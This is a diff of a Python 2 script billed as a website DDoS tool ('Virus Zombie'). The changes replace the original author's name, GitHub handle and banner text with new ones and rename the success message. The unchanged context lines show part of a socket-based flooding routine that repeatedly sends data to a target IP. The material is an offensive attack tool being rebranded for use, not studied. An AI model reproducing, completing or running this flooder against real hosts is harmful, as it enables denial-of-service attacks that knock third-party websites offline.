@@ -1,7 +1,7 @@
 #!/usr/bin/python
-# Virus
-# Mod by The Sixty Nine
-# Github: github.com/thesixtynine/Virus
+# Virus Zombie
+# Coded by Senja
+# Github: github.com/thedarksec/Virus
 
 import os, sys, time, string, socket
 
@@ -44,9 +44,9 @@ logo = """\033[1;77m                  ...
 """
 print (logo)
 
-print ("\033[0m[\033[94;1m#\033[0m] Ddos Attack The Website")
-print ("\033[0m[\033[93;1m*\033[0m] Mod by The Sixty Nine")
-print ("\033[0m[\033[96;1m&\033[0m] My Github @thesixtynine")
+print ("\033[0m[\033[94;1m#\033[0m] Ddos Attack The Virus Zombie")
+print ("\033[0m[\033[93;1m*\033[0m] Coded by Senja")
+print ("\033[0m[\033[96;1m&\033[0m] My Github @thedarksec")
 time.sleep(1)
 print
 
@@ -74,7 +74,7 @@ def dos():
         ddos.send( message );
     except socket.error, msg:
         print("\033[0m[\033[91;1m!\033[0m] \033[77;1mNo connection to \033[0m [" + ip + "]")
-    write ( "\033[0mSent [=\033[0;1;91m UFO \033[0m=] success to [\033[0;1;2;96m" + ip + "\033[0m]")
+    write ( "\033[0mSent [=\033[0;1;91m ZOMBIE \033[0m=] success to [\033[0;1;2;96m" + ip + "\033[0m]")
 
     ddos.close()
 for i in range(1, connect):
